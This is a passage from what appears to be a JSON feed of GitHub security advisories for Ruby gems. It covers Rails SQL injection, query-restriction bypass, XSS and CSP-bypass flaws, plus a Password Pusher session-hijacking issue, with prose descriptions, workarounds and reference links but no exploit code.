            "content_html": "<p>The Active Record component in Ruby on Rails efore 2.3.15, 3.0.x before 3.0.14, 3.1.x before 3.1.6, and 3.2.x before 3.2.6 does not properly implement the passing of request data to a where method in an ActiveRecord class, which allows remote attackers to conduct certain SQL injection attacks via nested query parameters that leverage improper handling of nested hashes, a related issue to CVE-2012-2661.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-2695\">https://nvd.nist.gov/vuln/detail/CVE-2012-2695</a></li>\n<li><a href=\"https://groups.google.com/group/rubyonrails-security/msg/aee3413fb038bf56?dmode=source&amp;output=gplain\">https://groups.google.com/group/rubyonrails-security/msg/aee3413fb038bf56?dmode=source&amp;output=gplain</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00002.html\">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00002.html</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00014.html\">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00014.html</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00016.html\">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00016.html</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html\">http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0154.html\">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2012-2695.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2012-2695.yml</a></li>\n<li><a href=\"https://groups.google.com/g/rubyonrails-security/c/l4L0TEVAz1k/m/Vr84sD9B464J\">https://groups.google.com/g/rubyonrails-security/c/l4L0TEVAz1k/m/Vr84sD9B464J</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/62f81f4d6b3ee40e9887ffd92ab14714bad93f18\">https://github.com/rails/rails/commit/62f81f4d6b3ee40e9887ffd92ab14714bad93f18</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-76wq-xw4h-f8wj\">https://github.com/advisories/GHSA-76wq-xw4h-f8wj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-76wq-xw4h-f8wj",
            "title": "[activerecord] activerecord vulnerable to SQL Injection",
            "date_modified": "2025-01-21T15:12:26.000Z",
            "date_published": "2017-10-24T18:33:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-76wq-xw4h-f8wj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>actionpack/lib/action_dispatch/http/request.rb</code> in Ruby on Rails before 3.0.14, 3.1.x before 3.1.6, and 3.2.x before 3.2.6 does not properly consider differences in parameter handling between the Active Record component and the Rack interface, which allows remote attackers to bypass intended database-query restrictions and perform NULL checks via a crafted request, as demonstrated by certain <code>['xyz', nil]</code> values, a related issue to CVE-2012-2660.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-2694\">https://nvd.nist.gov/vuln/detail/CVE-2012-2694</a></li>\n<li><a href=\"https://groups.google.com/group/rubyonrails-security/msg/e2d3a87f2c211def?dmode=source&amp;output=gplain\">https://groups.google.com/group/rubyonrails-security/msg/e2d3a87f2c211def?dmode=source&amp;output=gplain</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00002.html\">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00002.html</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00014.html\">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00014.html</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00016.html\">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00016.html</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00017.html\">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00017.html</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html\">http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0154.html\">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2012-2694.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2012-2694.yml</a></li>\n<li><a href=\"https://groups.google.com/g/rubyonrails-security/c/jILZ34tAHF4/m/7x0hLH-o0-IJ\">https://groups.google.com/g/rubyonrails-security/c/jILZ34tAHF4/m/7x0hLH-o0-IJ</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/2f3bc0467311781ac1ceb2c8c2b09002c8fe143a\">https://github.com/rails/rails/commit/2f3bc0467311781ac1ceb2c8c2b09002c8fe143a</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/c202638225519b5e1a03ebe523b109c948fb0e52\">https://github.com/rails/rails/commit/c202638225519b5e1a03ebe523b109c948fb0e52</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q34c-48gc-m9g8\">https://github.com/advisories/GHSA-q34c-48gc-m9g8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q34c-48gc-m9g8",
            "title": "[actionpack] actionpack allows remote attackers to bypass database-query restrictions, perform NULL checks via crafted request",
            "date_modified": "2025-01-20T16:29:12.000Z",
            "date_published": "2017-10-24T18:33:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q34c-48gc-m9g8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A cross-site scripting vulnerability flaw was found in the <code>auto_link</code> function in Rails before version 3.0.6.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2011-1497\">https://nvd.nist.gov/vuln/detail/CVE-2011-1497</a></li>\n<li><a href=\"https://github.com/rails/rails/blob/38df020c95beca7e12f0188cb7e18f3c37789e20/actionpack/CHANGELOG\">https://github.com/rails/rails/blob/38df020c95beca7e12f0188cb7e18f3c37789e20/actionpack/CHANGELOG</a></li>\n<li><a href=\"https://www.openwall.com/lists/oss-security/2011/04/06/13\">https://www.openwall.com/lists/oss-security/2011/04/06/13</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2011-1497.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2011-1497.yml</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/61ee3449674c591747db95f9b3472c5c3bd9e84d\">https://github.com/rails/rails/commit/61ee3449674c591747db95f9b3472c5c3bd9e84d</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/ab764ecbfea31a3b14323283287e2fc80955ace6\">https://github.com/rails/rails/commit/ab764ecbfea31a3b14323283287e2fc80955ace6</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q58j-fmvf-9rq6\">https://github.com/advisories/GHSA-q58j-fmvf-9rq6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q58j-fmvf-9rq6",
            "title": "[actionpack] Cross site scripting in actionpack Rubygem",
            "date_modified": "2025-01-20T16:18:31.000Z",
            "date_published": "2022-04-22T00:24:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q58j-fmvf-9rq6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A vulnerability has been reported in Password Pusher where an attacker can copy the session cookie before a user logs out, potentially allowing session hijacking.</p>\n<p>Although the session token is replaced and invalidated upon logout, if an attacker manages to capture the session cookie before this process, they can use the token to gain unauthorized access to the user's session until the token expires or is manually cleared.</p>\n<p>This vulnerability hinges on the attacker's ability to access the session cookie during an active session, either through a man-in-the-middle attack, by exploiting another vulnerability like XSS, or via direct access to the victim's device.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Although there is no direct resolution to this vulnerability, it is recommended to always use the latest version of Password Pusher to best mitigate risk.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If self-hosting, ensure Password Pusher is hosted exclusively over SSL connections to encrypt traffic and prevent session cookies from being intercepted in transit. Additionally, implement best practices in local security to safeguard user systems, browsers, and data against unauthorized access.</p>\n<p>To further mitigate session hijacking risks, Password Pusher implements the following security measures:</p>\n<ol>\n<li><strong>Automatic Session Expiration</strong>: Sessions are automatically expired after 2 hours of inactivity, reducing the window for potential exploitation.</li>\n<li><strong>Session Reset on Login and Logout</strong>: Sessions are fully reset both when a user logs in and logs out, ensuring that session tokens are not reusable post-logout. This practice invalidates old session tokens and issues new ones, minimizing the risk of session hijacking.</li>\n<li><strong>Encrypted Cookies</strong>: Cookies are encrypted using the value of SECRET_KEY_BASE from the application's configuration. This encryption adds a layer of protection against tampering or reading the session cookie's contents if intercepted, although it doesn't prevent the cookie from being used if stolen.</li>\n</ol>\n<p><strong>Note</strong>: While these measures significantly enhance security, they are part of a broader security strategy.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://edgeguides.rubyonrails.org/security.html#session-hijacking\">https://edgeguides.rubyonrails.org/security.html#session-hijacking</a></li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<p>Thank you to <a href=\"https://www.ptsecurity.com/ww-en/\">Positive Technologies</a> for reporting and working with me to bring this CVE to the community.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pglombardo/PasswordPusher/security/advisories/GHSA-4fwj-m62q-pp47\">https://github.com/pglombardo/PasswordPusher/security/advisories/GHSA-4fwj-m62q-pp47</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56733\">https://nvd.nist.gov/vuln/detail/CVE-2024-56733</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/pwpush/CVE-2024-56733.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/pwpush/CVE-2024-56733.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4fwj-m62q-pp47\">https://github.com/advisories/GHSA-4fwj-m62q-pp47</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4fwj-m62q-pp47",
            "title": "[pwpush] Password Pusher Allows Session Token Interception Leading to Potential Hijacking",
            "date_modified": "2024-12-31T18:42:51.000Z",
            "date_published": "2024-12-30T16:46:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4fwj-m62q-pp47"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>There is a possible Cross Site Scripting (XSS) vulnerability  in the <code>content_security_policy</code> helper in Action Pack.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>Applications which set Content-Security-Policy (CSP) headers dynamically from untrusted user input may be vulnerable to carefully crafted inputs being able to inject new directives into the CSP. This could lead to a bypass of the CSP and its protection against XSS and other attacks.</p>\n<h2 id=\"releases\">Releases</h2>\n<p>The fixed releases are available at the normal locations.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>Applications can avoid setting CSP headers dynamically from untrusted input, or can validate/sanitize that input.</p>\n<h2 id=\"credits\">Credits</h2>\n<p>Thanks to <a href=\"https://hackerone.com/ryotak\">ryotak</a> for the report!</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/rails/rails/security/advisories/GHSA-vfm5-rmrh-j26v\">https://github.com/rails/rails/security/advisories/GHSA-vfm5-rmrh-j26v</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-54133\">https://nvd.nist.gov/vuln/detail/CVE-2024-54133</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/2e3f41e4538b9ca1044357f6644f037bbb7c6c49\">https://github.com/rails/rails/commit/2e3f41e4538b9ca1044357f6644f037bbb7c6c49</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/3da2479cfe1e00177114b17e496213c40d286b3a\">https://github.com/rails/rails/commit/3da2479cfe1e00177114b17e496213c40d286b3a</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/5558e72f22fc69c1c407b31ac5fb3b4ce087b542\">https://github.com/rails/rails/commit/5558e72f22fc69c1c407b31ac5fb3b4ce087b542</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/cb16a3bb515b5d769f73926d9757270ace691f1d\">https://github.com/rails/rails/commit/cb16a3bb515b5d769f73926d9757270ace691f1d</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-54133.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-54133.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vfm5-rmrh-j26v\">https://github.com/advisories/GHSA-vfm5-rmrh-j26v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vfm5-rmrh-j26v",
            "title": "[actionpack] Possible Content Security Policy bypass in Action Dispatch",
            "date_modified": "2024-12-11T21:18:30.000Z",
            "date_published": "2024-12-10T22:42:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vfm5-rmrh-j26v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>There is a possible Cross Site Scripting (XSS) vulnerability  in the <code>content_security_policy</code> helper in Action Pack.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>Applications which set Content-Security-Policy (CSP) headers dynamically from untrusted user input may be vulnerable to carefully crafted inputs being able to inject new directives into the CSP. This could lead to a bypass of the CSP and its protection against XSS and other attacks.</p>\n<h2 id=\"releases\">Releases</h2>\n<p>The fixed releases are available at the normal locations.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>Applications can avoid setting CSP headers dynamically from untrusted input, or can validate/sanitize that input.</p>\n<h2 id=\"credits\">Credits</h2>\n<p>Thanks to <a href=\"https://hackerone.com/ryotak\">ryotak</a> for the report!</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/rails/rails/security/advisories/GHSA-vfm5-rmrh-j26v\">https://github.com/rails/rails/security/advisories/GHSA-vfm5-rmrh-j26v</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-54133\">https://nvd.nist.gov/vuln/detail/CVE-2024-54133</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/2e3f41e4538b9ca1044357f6644f037bbb7c6c49\">https://github.com/rails/rails/commit/2e3f41e4538b9ca1044357f6644f037bbb7c6c49</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/3da2479cfe1e00177114b17e496213c40d286b3a\">https://github.com/rails/rails/commit/3da2479cfe1e00177114b17e496213c40d286b3a</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/5558e72f22fc69c1c407b31ac5fb3b4ce087b542\">https://github.com/rails/rails/commit/5558e72f22fc69c1c407b31ac5fb3b4ce087b542</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/cb16a3bb515b5d769f73926d9757270ace691f1d\">https://github.com/rails/rails/commit/cb16a3bb515b5d769f73926d9757270ace691f1d</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-54133.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-54133.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vfm5-rmrh-j26v\">https://github.com/advisories/GHSA-vfm5-rmrh-j26v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vfm5-rmrh-j26v",
            "title": "[actionpack] Possible Content Security Policy bypass in Action Dispatch",
            "date_modified": "2024-12-11T21:18:30.000Z",
            "date_published": "2024-12-10T22:42:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vfm5-rmrh-j26v"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}